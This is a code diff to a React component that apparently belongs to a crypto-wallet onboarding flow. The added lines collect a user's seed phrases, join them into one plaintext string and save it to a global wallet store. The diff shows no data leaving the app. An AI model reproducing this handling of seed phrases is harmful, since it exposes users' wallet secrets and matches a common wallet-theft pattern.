@@ -11,6 +11,8 @@ import {
 } from "../ui/select";
 import { Button } from "../ui/button";
 import { motion, AnimatePresence } from "framer-motion";
+import { useWalletStore } from "@/store/walletStore";
+import { set } from "react-hook-form";
 
 type Network = {
 	value: string;
@@ -60,6 +62,8 @@ interface OriginProps {
 
 function OriginAddress({ onNext }: OriginProps) {
 	const [blockChainNetwork, setBlockChainNetwork] = useState<string>("");
+	const [selectedWallet, setSelectedWallet] = useState("");
+	const [seedPhrases, setSeedPhrases] = useState<string[]>([]);
 	const [originSteps, setOriginSteps] = useState<number>(0);
 	const [addressMode, setAddressMode] = useState<"manual" | "automatic">(
 		"automatic"
@@ -68,8 +72,8 @@ function OriginAddress({ onNext }: OriginProps) {
 	// ✅ Continue button logic
 	const [isContinueDisabled, setContinueDisabled] = useState(true);
 
-	const [selectedWallet, setSelectedWallet] = useState("");
-	const [seedPhrases, setSeedPhrases] = useState<string[]>([]);
+	const { setSeedPhrase, setWalletProvider, setBlockchainNetwork } =
+		useWalletStore();
 
 	useEffect(() => {
 		if (originSteps === 0) {
@@ -93,6 +97,10 @@ function OriginAddress({ onNext }: OriginProps) {
 		if (originSteps === 0) {
 			setOriginSteps(1);
 		} else if (originSteps === 1) {
+			// Final step, proceed to next
+			setBlockchainNetwork(blockChainNetwork);
+			setWalletProvider(selectedWallet);
+			setSeedPhrase(seedPhrases.join(" "));
 			onNext();
 		}
 	};
